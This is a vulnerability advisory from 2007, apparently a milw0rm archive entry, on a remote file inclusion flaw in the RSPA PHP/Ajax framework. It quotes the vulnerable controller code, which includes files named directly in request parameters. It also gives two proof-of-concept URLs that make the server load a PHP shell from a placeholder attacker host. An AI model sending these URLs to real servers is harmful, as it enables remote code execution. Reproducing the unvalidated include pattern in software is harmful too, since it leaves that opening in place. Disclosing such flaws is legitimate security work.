@@ -1,0 +1,57 @@
+RSPA Remote File Inclusion
+
+Really Simple PHP and Ajax (RSPA)
+RSPA is a component based event driven ajax enabled framework for PHP4 and PHP 5. It is a combination of plane PHP class and HTML/Javascript.RSPA allows calling server side PHP functions from client javascript events. Visit http://rspa.sourceforge.net
+
+Credit:
+The information has been provided by Hamid Ebadi
+The original article can be found at : http://www.bugtraq.ir
+
+http://www.bugtraq.ir/articles/advisory/RSPA_File_Inclusion/6
+
+Vulnerable Systems:
+Version: rspa-2007-03-23
+
+Description:
+Input passed to the" __IncludeFilePHPClass ", " __ClassPath" and " __class" parameters in "rspa/framework/Controller_v5.php" and " rspa/framework/Controller_v4.php " is not properly verified before being used to include files. This can be exploited to execute arbitrary PHP code by including files from local or external resources.
+
+
+read more about file inclusion in http://www.bugtraq.ir/articles
+
+Vulnerable Code :
+require_once("rspaconf.inc.php");
+
+	$className = $_REQUEST['__class'];
+	$methordName =  $_REQUEST['__methord'];
+
+	// IncludeFile for PHP Class
+		if ($_REQUEST['__IncludeFilePHPClass']){
+			$filename = $_REQUEST['__IncludeFilePHPClass'];
+			require_once ($filename);
+		}
+
+	// Parms
+		if (isset($_REQUEST['__parameters'])){$parameter = getParms($_REQUEST['__parameters']);}else{$parameter="";}
+
+	// ClassFile + ClassPath
+		include ("../components/Form.class.php");
+	 	if ($_REQUEST["__ClassPath"]=="null" || empty($_REQUEST["__ClassPath"])){
+	 		$filename = $RSPA['class_folder'].$className.$RSPA['class_extension'];
+	 	}else{
+	 		$filename = $_REQUEST["__ClassPath"].$className.$RSPA['class_extension'];
+	 	}
+	 	require_once($filename);
+
+
+
+POC exploit :
+The following URL will cause remote file inclusion
+
+http://[HOST]/rspa/framework/Controller_v5.php?__IncludeFilePHPClass=http://attacker/phpshell.txt/?
+http://[HOST]/rspa/framework/Controller_v4.php?__ClassPath=http://attacker/phpshell.txt/?
+
+[ http://www.bugtraq.ir/articles/advisory/RSPA_File_Inclusion/6 ]
+
+# copyright : http://www.bugtraq.ir
+
+# milw0rm.com [2007-04-02]
